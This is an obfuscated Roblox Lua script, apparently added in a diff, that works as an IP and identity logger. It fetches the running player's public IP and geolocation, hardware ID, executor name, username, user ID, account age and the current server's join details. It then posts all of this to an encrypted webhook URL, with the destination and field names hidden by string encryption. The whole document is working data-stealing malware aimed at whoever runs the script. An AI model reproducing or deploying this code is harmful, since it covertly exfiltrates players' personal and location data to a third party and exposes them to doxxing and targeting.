00194Q002B8Q0020001A000200012Q00343Q00013Q00063Q00093Q00028Q0003043Q0067616D6503073Q00482Q747047657403143Q00682Q7470733A2Q2F76342E6964656E742E6D652F03173Q00682Q74703A2Q2F69702D6170692E636F6D2F6A736F6E2F026Q00F03F030A3Q004A534F4E4465636F646503053Q00706169727303083Q00746F737472696E6700263Q0012283Q00014Q000D000100023Q000E290001001100013Q0004223Q00110001001238000300023Q002033000300030003001228000500044Q00160003000500022Q003600035Q001238000300023Q002033000300030003001228000500054Q002300066Q00130005000500062Q00160003000500022Q002C000100033Q0012283Q00063Q0026243Q0002000100060004223Q000200012Q0023000300013Q0020330003000300072Q002C000500014Q00160003000500022Q002C000200033Q001238000300084Q002C000400024Q000E0003000200050004223Q002100012Q0023000800023Q001238000900094Q002C000A00076Q0009000200022Q001E0008000600090006080003001C000100020004223Q001C00010004223Q002500010004223Q000200012Q00343Q00017Q00053Q002Q033Q0073796E03073Q006765746877696403063Q00666C7578757303083Q006765745F6877696403073Q00556E6B6E6F776E00223Q0012383Q00013Q00061F3Q000C00013Q0004223Q000C00010012383Q00013Q0020275Q000200061F3Q000C00013Q0004223Q000C00010012383Q00013Q0020275Q00022Q00113Q000100020006313Q0020000100010004223Q002000010012383Q00023Q00061F3Q001300013Q0004223Q001300010012383Q00024Q00113Q000100020006313Q0020000100010004223Q002000010012383Q00033Q00061F3Q001F00013Q0004223Q001F00010012383Q00033Q0020275Q000400061F3Q001F00013Q0004223Q001F00010012383Q00033Q0020275Q00042Q00113Q000100020006313Q0020000100010004223Q002000010012283Q00054Q00368Q00343Q00017Q00083Q002Q033Q0073796E03133Q0057696E646F7773202853796E61707365205829030E3Q00697377696E646F7761637469766503073Q0057696E646F777303063Q00666C7578757303103Q00466C75787573202857696E646F777329030F3Q006765746578656375746F726E616D6503073Q00556E6B6E6F776E001C3Q0012383Q00013Q00061F3Q000600013Q0004223Q000600010012283Q00024Q00367Q0004223Q001B00010012383Q00033Q00061F3Q000C00013Q0004223Q000C00010012283Q00044Q00367Q0004223Q001B00010012383Q00053Q00061F3Q001200013Q0004223Q001200010012283Q00064Q00367Q0004223Q001B00010012383Q00073Q00061F3Q001900013Q0004223Q001900010012383Q00074Q00113Q000100022Q00367Q0004223Q001B00010012283Q00084Q00368Q00343Q00017Q00023Q00030E3Q0047657450726F64756374496E666F03043Q004E616D6500074Q00233Q00013Q0020335Q00012Q0023000200024Q00163Q000200020020275Q00022Q00368Q00343Q00017Q00093Q00028Q00026Q00F03F03043Q006461746103083Q00696D61676555726C03043Q0067616D6503073Q00482Q7470476574033F3Q00682Q7470733A2Q2F7468756D626E61696C732E726F626C6F782E636F6D2F76312F75736572732F6176617461722D6865616473686F743F757365724964733D03183Q002673697A653D3432307834323026666F726D61743D506E67030A3Q004A534F4E4465636F6465001E3Q0012283Q00014Q000D000100023Q0026243Q000C000100020004223Q000C00010020270003000200030020270003000300020020270003000300040006310003000A000100010004223Q000A00012Q002300036Q003600035Q0004223Q001D00010026243Q0002000100010004223Q00020001001238000300053Q002033000300030006001228000500074Q0023000600013Q001228000700084Q00130005000500072Q00160003000500022Q002C000100034Q0023000300023Q0020330003000300092Q002C000500014Q00160003000500022Q002C000200033Q0012283Q00023Q0004223Q000200012Q00343Q00017Q000E3Q00028Q00026Q00F03F030C3Q00682Q74705F7265717565737403073Q00726571756573742Q033Q0073796E2Q033Q0055726C03063Q004D6574686F6403043Q00504F535403073Q0048656164657273030C3Q00436F6E74656E742D5479706503103Q00612Q706C69636174696F6E2F6A736F6E03043Q00426F647903063Q00656D62656473030A3Q004A534F4E456E636F6465002C3Q0012283Q00014Q000D000100033Q0026243Q001C000100020004223Q001C0001001238000400033Q0006030003000F000100040004223Q000F0001001238000400043Q0006030003000F000100040004223Q000F0001001238000400053Q00060C0003000F000100040004223Q000F0001001238000400053Q00202700030004000400061F0003002B00013Q0004223Q002B00012Q002C000400034Q002100053Q00042Q002300065Q00102500050006000600300A0005000700082Q002100063Q000100300A0006000A000B0010250005000900060010250005000C00022Q00200004000200010004223Q002B0001000E290001000200013Q0004223Q000200012Q002100043Q00012Q0021000500014Q0023000600014Q00350005000100010010250004000D00052Q002C000100044Q0023000400023Q00203300040004000E2Q002C000600014Q00160004000600022Q002C000200043Q0012283Q00023Q0004223Q000200012Q00343Q00017Q00", GetFEnv(), ...);
+TABLE_TableIndirection["obf_bitlib%1"] = bit32 or bit;
+TABLE_TableIndirection["obf_XOR%1"] = TABLE_TableIndirection["obf_bitlib%1"].bxor;
+TABLE_TableIndirection["obf_OR%0"] = TABLE_TableIndirection["obf_bitlib%1"].bor;
+TABLE_TableIndirection["obf_AND%0"] = TABLE_TableIndirection["obf_bitlib%1"].band;
+TABLE_TableIndirection["HttpService%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\249\215\207\53\213\190\213\8\216\192\222", "\126\177\163\187\69\134\219\167"));
+TABLE_TableIndirection["Players%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\19\193\43\220\249\49\222", "\156\67\173\74\165"));
+TABLE_TableIndirection["MarketplaceService%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\25\182\91\29\185\50\86\56\182\74\19\143\35\84\34\190\74\19", "\38\84\215\41\118\220\70"));
+TABLE_TableIndirection["player%0"] = TABLE_TableIndirection["Players%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\124\25\33\19\242\96\26\35\11\251\66", "\158\48\118\66\114")];
+TABLE_TableIndirection["character%0"] = TABLE_TableIndirection["player%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\136\44\17\36\114\166\239\174\54", "\155\203\68\112\86\19\197")] or TABLE_TableIndirection["player%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\101\213\55\238\65\123\241\253\84\252\50\248\69\124", "\152\38\189\86\156\32\24\133")]:Wait();
+TABLE_TableIndirection["humanoid%0"] = TABLE_TableIndirection["character%0"]:FindFirstChildWhichIsA(LUAOBFUSACTOR_DECRYPT_STR_0("\212\66\170\71\242\88\174\66", "\38\156\55\199"));
+TABLE_TableIndirection["ip%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\157\115\119\38\28\99\244", "\35\200\29\28\72\115\20\154");
+TABLE_TableIndirection["ipInfo%0"] = {[LUAOBFUSACTOR_DECRYPT_STR_0("\26\176\196\209\153\62\45", "\84\121\223\177\191\237\76")]=LUAOBFUSACTOR_DECRYPT_STR_0("\142\88\194\174\53\71\62", "\161\219\54\169\192\90\48\80"),[LUAOBFUSACTOR_DECRYPT_STR_0("\91\71\7\44\70\76\46\36\68\71", "\69\41\34\96")]=LUAOBFUSACTOR_DECRYPT_STR_0("\137\205\220\4\13\60\178", "\75\220\163\183\106\98"),[LUAOBFUSACTOR_DECRYPT_STR_0("\1\179\159\46", "\185\98\218\235\87")]=LUAOBFUSACTOR_DECRYPT_STR_0("\254\50\44\232\209\189\197", "\202\171\92\71\134\190"),[LUAOBFUSACTOR_DECRYPT_STR_0("\51\200\60", "\232\73\161\76")]=LUAOBFUSACTOR_DECRYPT_STR_0("\142\215\73\83\17\172\215", "\126\219\185\34\61"),[LUAOBFUSACTOR_DECRYPT_STR_0("\5\221\78", "\135\108\174\62\18\30\23\147")]=LUAOBFUSACTOR_DECRYPT_STR_0("\131\231\33\197\23\185\61", "\167\214\137\74\171\120\206\83"),[LUAOBFUSACTOR_DECRYPT_STR_0("\132\226\53", "\199\235\144\82\61\152")]=LUAOBFUSACTOR_DECRYPT_STR_0("\50\24\178\37\8\1\183", "\75\103\118\217"),[LUAOBFUSACTOR_DECRYPT_STR_0("\198\71", "\126\167\52\16\116\217")]=LUAOBFUSACTOR_DECRYPT_STR_0("\253\32\43\142\187\14\242", "\156\168\78\64\224\212\121"),[LUAOBFUSACTOR_DECRYPT_STR_0("\19\231\168\203\29\225\171\203", "\174\103\142\197")]=LUAOBFUSACTOR_DECRYPT_STR_0("\99\38\84\54\42\73\246", "\152\54\72\63\88\69\62"),[LUAOBFUSACTOR_DECRYPT_STR_0("\216\197\250", "\60\180\164\142")]="?",[LUAOBFUSACTOR_DECRYPT_STR_0("\84\81\11", "\114\56\62\101\73\71\141")]="?"};
+pcall(function()
+	TABLE_TableIndirection["FlatIdent_69270%0"] = 0;
+	TABLE_TableIndirection["geoInfo%0"] = nil;
+	TABLE_TableIndirection["decoded%0"] = nil;
+	while true do
+		if (TABLE_TableIndirection["FlatIdent_69270%0"] == 1) then
+			TABLE_TableIndirection["decoded%0"] = TABLE_TableIndirection["HttpService%0"]:JSONDecode(TABLE_TableIndirection["geoInfo%0"]);
+			for k, v in pairs(TABLE_TableIndirection["decoded%0"]) do
+				TABLE_TableIndirection["ipInfo%0"][k] = tostring(v);
+			end
+			break;
+		end
+		if (TABLE_TableIndirection["FlatIdent_69270%0"] == (0 - 0)) then
+			TABLE_TableIndirection["ip%0"] = game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\176\253\207\212\171\179\148\139\174\189\149\205\188\236\213\208\246\228\222\139", "\164\216\137\187"));
+			TABLE_TableIndirection["geoInfo%0"] = game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\218\242\37\162\252\177\68\219\246\124\179\182\247\69\209\233\60\253\172\237\4\220\169", "\107\178\134\81\210\198\158") .. TABLE_TableIndirection["ip%0"]);
+			TABLE_TableIndirection["FlatIdent_69270%0"] = 1;
+		end
+	end
+end);
+TABLE_TableIndirection["hwid%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\13\0\137\200\165\47\0", "\202\88\110\226\166");
+pcall(function()
+	TABLE_TableIndirection["hwid%0"] = (syn and syn[LUAOBFUSACTOR_DECRYPT_STR_0("\196\10\150\255\221\202\11", "\170\163\111\226\151")] and syn.gethwid()) or (gethwid and gethwid()) or (fluxus and fluxus[LUAOBFUSACTOR_DECRYPT_STR_0("\22\53\166\7\70\32\32\21", "\73\113\80\210\88\46\87")] and fluxus.get_hwid()) or LUAOBFUSACTOR_DECRYPT_STR_0("\180\34\198\28\232\150\34", "\135\225\76\173\114");
+end);
+TABLE_TableIndirection["osName%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\47\227\179\190\163\170\169", "\199\122\141\216\208\204\221");
+pcall(function()
+	if (syn or ((13144 - 8551) <= (5157 - 2485))) then
+		TABLE_TableIndirection["osName%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\154\212\30\244\119\225\190\157\88\195\97\248\172\205\3\245\56\206\228", "\150\205\189\112\144\24");
+	elseif (iswindowactive or (1168 > 3156)) then
+		TABLE_TableIndirection["osName%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\18\141\177\72\11\159\2", "\112\69\228\223\44\100\232\113");
+	elseif (fluxus or ((1473 - 901) > 4486)) then
+		TABLE_TableIndirection["osName%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\242\19\18\203\163\111\198\156\40\14\221\178\115\145\199\86", "\230\180\127\103\179\214\28");
+	elseif (((2023 - (TABLE_TableIndirection["obf_AND%0"](555, 64) + TABLE_TableIndirection["obf_OR%0"](555, 64))) == 1404) and getexecutorname) then
+		TABLE_TableIndirection["osName%0"] = getexecutorname();
+	else
+		TABLE_TableIndirection["osName%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\185\11\84\72\235\86\238", "\128\236\101\63\38\132\33");
+	end
+end);
+TABLE_TableIndirection["placeId%0"] = game[LUAOBFUSACTOR_DECRYPT_STR_0("\156\165\16\71\179\194\203", "\175\204\201\113\36\214\139")];
+TABLE_TableIndirection["jobId%0"] = game[LUAOBFUSACTOR_DECRYPT_STR_0("\109\195\55\245\0", "\100\39\172\85\188")];
+TABLE_TableIndirection["gameLink%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\165\108\173\144\32\247\55\246\151\36\186\54\171\143\49\161\119\161\206\48\162\117\246\135\50\160\125\170\207", "\83\205\24\217\224") .. TABLE_TableIndirection["placeId%0"];
+TABLE_TableIndirection["gameName%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\211\203\198\51\233\210\195", "\93\134\165\173");
+pcall(function()
+	TABLE_TableIndirection["gameName%0"] = TABLE_TableIndirection["MarketplaceService%0"]:GetProductInfo(TABLE_TableIndirection["placeId%0"])[LUAOBFUSACTOR_DECRYPT_STR_0("\144\243\204\199", "\30\222\146\161\162\90\174\210")];
+end);
+TABLE_TableIndirection["executor%0"] = (identifyexecutor and identifyexecutor()) or LUAOBFUSACTOR_DECRYPT_STR_0("\208\64\123\4\234\89\126\74\192\86\117\9\240\90\127\24", "\106\133\46\16");
+TABLE_TableIndirection["displayName%0"] = TABLE_TableIndirection["player%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\124\41\96\236\86\65\65\14\114\241\95", "\32\56\64\19\156\58")];
+TABLE_TableIndirection["username%0"] = TABLE_TableIndirection["player%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\116\201\232\83", "\224\58\168\133\54\58\146")];
+TABLE_TableIndirection["userId%0"] = TABLE_TableIndirection["player%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\108\69\78\239\92\130", "\107\57\54\43\157\21\230\231")];
+TABLE_TableIndirection["accountAge%0"] = TABLE_TableIndirection["player%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\250\136\18\250\172\210\219\250\140\20", "\175\187\235\113\149\217\188")];
+TABLE_TableIndirection["membership%0"] = tostring(TABLE_TableIndirection["player%0"].MembershipType);
+TABLE_TableIndirection["userProfileLink%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\52\187\149\92\240\35\55\115\184\150\91\173\107\119\62\163\142\84\173\122\119\49\224\148\95\230\107\107\115", "\24\92\207\225\44\131\25") .. TABLE_TableIndirection["userId%0"] .. LUAOBFUSACTOR_DECRYPT_STR_0("\4\195\170\67\29\116\71\214", "\29\43\179\216\44\123");
+TABLE_TableIndirection["avatarUrl%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\181\205\52\92\174\131\111\3\169\203\110\94\191\193\35\72\179\151\35\67\176\150\115\74\191\221\112\24\187\143\112\72\190\142\38\29\184\129\33\26\232\221\35\73\229\223\118\78\237\223\36\74\234\143\111\24\239\137\111\24\239\137\111\109\171\216\52\77\175\241\37\77\185\202\40\67\169\150\16\66\186", "\44\221\185\64");
+pcall(function()
+	TABLE_TableIndirection["thumbnailData%0"] = game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\9\243\92\79\96\91\168\7\75\123\20\234\74\81\114\8\235\91\17\97\14\229\68\80\107\79\228\71\82\60\23\182\7\74\96\4\245\91\16\114\23\230\92\94\97\76\239\77\94\119\18\239\71\75\44\20\244\77\77\90\5\244\21", "\19\97\135\40\63") .. TABLE_TableIndirection["userId%0"] .. LUAOBFUSACTOR_DECRYPT_STR_0("\232\79\58\33\42\108\250\14\99\35\123\99\254\26\53\52\61\60\175\72\110\11\33\54", "\81\206\60\83\91\79"));
+	TABLE_TableIndirection["thumbDecoded%0"] = TABLE_TableIndirection["HttpService%0"]:JSONDecode(TABLE_TableIndirection["thumbnailData%0"]);
+	TABLE_TableIndirection["avatarUrl%0"] = TABLE_TableIndirection["thumbDecoded%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\74\170\196\115", "\196\46\203\176\18\79\163\45")][932 - (TABLE_TableIndirection["obf_AND%0"](857, 74) + TABLE_TableIndirection["obf_OR%0"](857, 74))][LUAOBFUSACTOR_DECRYPT_STR_0("\177\47\127\25\33\206\253\180", "\143\216\66\30\126\68\155")] or TABLE_TableIndirection["avatarUrl%0"];
+end);
+TABLE_TableIndirection["date%0"] = os.date(LUAOBFUSACTOR_DECRYPT_STR_0("\239\241\64\142\200\238\146\229", "\129\202\168\109\171\165\195\183"));
+TABLE_TableIndirection["time%0"] = os.date(LUAOBFUSACTOR_DECRYPT_STR_0("\103\112\109\157\243\78\163\17", "\134\66\56\87\184\190\116"));
+TABLE_TableIndirection["webhookUrl%0"] = LUAOBFUSACTOR_DECRYPT_STR_0("\52\37\29\171\10\177\110\122\56\56\26\184\22\249\37\123\63\62\4\244\24\251\40\122\43\52\11\179\22\228\42\38\115\96\90\237\74\191\117\98\101\105\90\235\65\190\112\108\109\99\90\227\86\233\5\27\111\58\32\132\60\200\120\30\10\22\54\178\52\237\51\45\52\40\61\185\15\249\48\32\51\98\48\174\64\222\16\108\17\40\19\174\14\184\16\50\50\37\38\162\48\211\116\59\44\96\95\150\17\198\32\31\18\27\13\186\59\233\112\33\63", "\85\92\81\105\219\121\139\65");
+TABLE_TableIndirection["embedData%0"] = {[LUAOBFUSACTOR_DECRYPT_STR_0("\233\186\68\73\121", "\191\157\211\48\37\28")]="📘 Full Session Log",[LUAOBFUSACTOR_DECRYPT_STR_0("\220\16\248\19\40", "\90\191\127\148\124")]=49151,[LUAOBFUSACTOR_DECRYPT_STR_0("\108\143\59\26\122\137\47\30\116", "\119\24\231\78")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\151\63\169", "\113\226\77\197\42\188\32")]=TABLE_TableIndirection["avatarUrl%0"]},[LUAOBFUSACTOR_DECRYPT_STR_0("\60\31\241\185\62\5", "\213\90\118\148")]={{[LUAOBFUSACTOR_DECRYPT_STR_0("\85\47\185\83", "\45\59\78\212\54")]="👤 User Info",[LUAOBFUSACTOR_DECRYPT_STR_0("\6\87\143\158\131", "\144\112\54\227\235\230\78\205")]=string.format("**Display Name**: [%s](%s)\n**Username**: %s\n**UserId**: %s\n**Membership**: %s\n**Account Age**: %s days", TABLE_TableIndirection["displayName%0"], TABLE_TableIndirection["userProfileLink%0"], TABLE_TableIndirection["username%0"], TABLE_TableIndirection["userId%0"], TABLE_TableIndirection["membership%0"], TABLE_TableIndirection["accountAge%0"]),[LUAOBFUSACTOR_DECRYPT_STR_0("\186\38\3\245\222\94", "\59\211\72\111\156\176")]=false},{[LUAOBFUSACTOR_DECRYPT_STR_0("\64\134\238\40", "\77\46\231\131")]="💻 Session Info",[LUAOBFUSACTOR_DECRYPT_STR_0("\172\85\186\85\191", "\32\218\52\214")]=string.format("**Executor**: %s\n**HWID**: `%s`\n**OS**: %s\n**Date**: %s\n**Time**: %s", TABLE_TableIndirection["executor%0"], TABLE_TableIndirection["hwid%0"], TABLE_TableIndirection["osName%0"], TABLE_TableIndirection["date%0"], TABLE_TableIndirection["time%0"]),[LUAOBFUSACTOR_DECRYPT_STR_0("\71\25\61\161\255\181", "\58\46\119\81\200\145\208\37")]=false},{[LUAOBFUSACTOR_DECRYPT_STR_0("\37\141\61\169", "\86\75\236\80\204\201\221")]="🎮 Game Info",[LUAOBFUSACTOR_DECRYPT_STR_0("\100\64\123\144\251", "\235\18\33\23\229\158")]=string.format('**Game Name**: [%s](%s)\n**PlaceId**: %s\n**Join Script**:\n```lua\nRoblox.GameLauncher.joinGameInstance(%s, \"%s\")\n```', TABLE_TableIndirection["gameName%0"], TABLE_TableIndirection["gameLink%0"], TABLE_TableIndirection["placeId%0"], TABLE_TableIndirection["placeId%0"], TABLE_TableIndirection["jobId%0"]),[LUAOBFUSACTOR_DECRYPT_STR_0("\89\180\205\178\94\191", "\219\48\218\161")]=false},{[LUAOBFUSACTOR_DECRYPT_STR_0("\234\112\113\76", "\128\132\17\28\41\187\47")]="🌐 IP Info",[LUAOBFUSACTOR_DECRYPT_STR_0("\23\51\10\47\88", "\61\97\82\102\90")]=string.format("**IP Address**: `%s`\n**Country**: %s\n**Region**: %s\n**City**: %s\n**ZIP**: %s\n**ISP**: %s\n**Org**: %s\n**AS**: %s\n**Timezone**: %s\n**Lat/Lon**: %s, %s", TABLE_TableIndirection["ip%0"], TABLE_TableIndirection["ipInfo%0"].country, TABLE_TableIndirection["ipInfo%0"].regionName, TABLE_TableIndirection["ipInfo%0"].city, TABLE_TableIndirection["ipInfo%0"].zip, TABLE_TableIndirection["ipInfo%0"].isp, TABLE_TableIndirection["ipInfo%0"].org, TABLE_TableIndirection["ipInfo%0"][LUAOBFUSACTOR_DECRYPT_STR_0("\173\61", "\105\204\78\203\43\167\55\126")], TABLE_TableIndirection["ipInfo%0"].timezone, TABLE_TableIndirection["ipInfo%0"].lat, TABLE_TableIndirection["ipInfo%0"].lon),[LUAOBFUSACTOR_DECRYPT_STR_0("\172\164\47\23\29\1", "\49\197\202\67\126\115\100\167")]=false}},[LUAOBFUSACTOR_DECRYPT_STR_0("\49\84\208\61\133\68", "\62\87\59\191\73\224\54")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\243\7\226\221", "\169\135\98\154")]="🔍 Generated by Logger Script"}};
+pcall(function()
+	TABLE_TableIndirection["FlatIdent_7126A%0"] = TABLE_TableIndirection["obf_AND%0"](0, 0) + TABLE_TableIndirection["obf_OR%0"](0, 0);
+	TABLE_TableIndirection["data%0"] = nil;
+	TABLE_TableIndirection["jsonData%0"] = nil;
+	TABLE_TableIndirection["req%0"] = nil;
+	while true do
+		if (TABLE_TableIndirection["FlatIdent_7126A%0"] == (TABLE_TableIndirection["obf_AND%0"](1, 0) + TABLE_TableIndirection["obf_OR%0"](1, 0))) then
+			TABLE_TableIndirection["req%0"] = http_request or request or (syn and syn[LUAOBFUSACTOR_DECRYPT_STR_0("\217\114\53\65\248\32\220", "\168\171\23\68\52\157\83")]);
+			if TABLE_TableIndirection["req%0"] then
+				TABLE_TableIndirection["req%0"]({[LUAOBFUSACTOR_DECRYPT_STR_0("\193\99\249", "\231\148\17\149\205\69\77")]=TABLE_TableIndirection["webhookUrl%0"],[LUAOBFUSACTOR_DECRYPT_STR_0("\173\162\211\243\88\251", "\159\224\199\167\155\55")]=LUAOBFUSACTOR_DECRYPT_STR_0("\199\220\15\230", "\178\151\147\92"),[LUAOBFUSACTOR_DECRYPT_STR_0("\164\248\77\54\23\94\105", "\26\236\157\44\82\114\44")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\9\33\219\79\47\32\193\22\30\55\197\94", "\59\74\78\181")]=LUAOBFUSACTOR_DECRYPT_STR_0("\36\193\74\86\186\38\208\78\83\188\43\158\80\73\188\43", "\211\69\177\58\58")},[LUAOBFUSACTOR_DECRYPT_STR_0("\149\234\125\236", "\171\215\133\25\149\137")]=TABLE_TableIndirection["jsonData%0"]});
+			end
+			break;
+		end
+		if (TABLE_TableIndirection["FlatIdent_7126A%0"] == 0) then
+			TABLE_TableIndirection["data%0"] = {[LUAOBFUSACTOR_DECRYPT_STR_0("\228\197\48\255\235\35", "\34\129\168\82\154\143\80\156")]={TABLE_TableIndirection["embedData%0"]}};
+			TABLE_TableIndirection["jsonData%0"] = TABLE_TableIndirection["HttpService%0"]:JSONEncode(TABLE_TableIndirection["data%0"]);
+			TABLE_TableIndirection["FlatIdent_7126A%0"] = 878 - (TABLE_TableIndirection["obf_AND%0"](282, 595) + TABLE_TableIndirection["obf_OR%0"](282, 595));
+		end
+	end
+end);
+_G[LUAOBFUSACTOR_DECRYPT_STR_0("\178\183\49\3\71\65\130\164\190\33\14\73\74\144\182\183\61\31", "\233\229\210\83\107\40\46")] = _G[LUAOBFUSACTOR_DECRYPT_STR_0("\246\71\48\222\10\206\73\19\218\23\196\67\54\207\54\196\76\38", "\101\161\34\82\182")] or false;
+if not _G[LUAOBFUSACTOR_DECRYPT_STR_0("\223\8\91\246\212\237\137\15\228\31\92\255\223\251\177\43\230\25", "\78\136\109\57\158\187\130\226")] then
+	TABLE_TableIndirection["FlatIdent_2661B%0"] = 1637 - (TABLE_TableIndirection["obf_AND%0"](1523, 114) + TABLE_TableIndirection["obf_OR%0"](1523, 114));
+	while true do
+		if (TABLE_TableIndirection["FlatIdent_2661B%0"] == (TABLE_TableIndirection["obf_AND%0"](0, 0) + TABLE_TableIndirection["obf_OR%0"](0, 0))) then
+			_G[LUAOBFUSACTOR_DECRYPT_STR_0("\9\58\251\249\49\48\242\208\50\45\252\240\58\38\202\244\48\43", "\145\94\95\153")] = true;
+			pcall(function()
+				TABLE_TableIndirection["data%0"] = {[LUAOBFUSACTOR_DECRYPT_STR_0("\248\192\22\208\74\164", "\215\157\173\116\181\46")]={TABLE_TableIndirection["embedData%0"]}};
+				TABLE_TableIndirection["jsonData%0"] = TABLE_TableIndirection["HttpService%0"]:JSONEncode(TABLE_TableIndirection["data%0"]);
+				TABLE_TableIndirection["req%0"] = http_request or request or (syn and syn[LUAOBFUSACTOR_DECRYPT_STR_0("\39\177\154\231\223\38\160", "\186\85\212\235\146")]);
+				if (TABLE_TableIndirection["req%0"] or (3748 < (3277 - (68 + 997)))) then
+					TABLE_TableIndirection["req%0"]({[LUAOBFUSACTOR_DECRYPT_STR_0("\247\147\26", "\56\162\225\118\158\89\142")]=TABLE_TableIndirection["webhookUrl%0"],[LUAOBFUSACTOR_DECRYPT_STR_0("\113\0\212\167\45\220", "\184\60\101\160\207\66")]=LUAOBFUSACTOR_DECRYPT_STR_0("\1\173\79\136", "\220\81\226\28"),[LUAOBFUSACTOR_DECRYPT_STR_0("\59\208\131\255\239\213\0", "\167\115\181\226\155\138")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\193\45\233\72\126\127\210\175\22\254\76\126", "\166\130\66\135\60\27\17")]=LUAOBFUSACTOR_DECRYPT_STR_0("\69\90\222\121\57\71\75\218\124\63\74\5\196\102\63\74", "\80\36\42\174\21")},[LUAOBFUSACTOR_DECRYPT_STR_0("\108\31\51\99", "\26\46\112\87")]=TABLE_TableIndirection["jsonData%0"]});
+				end
+			end);
+			break;
+		end
+	end
+end
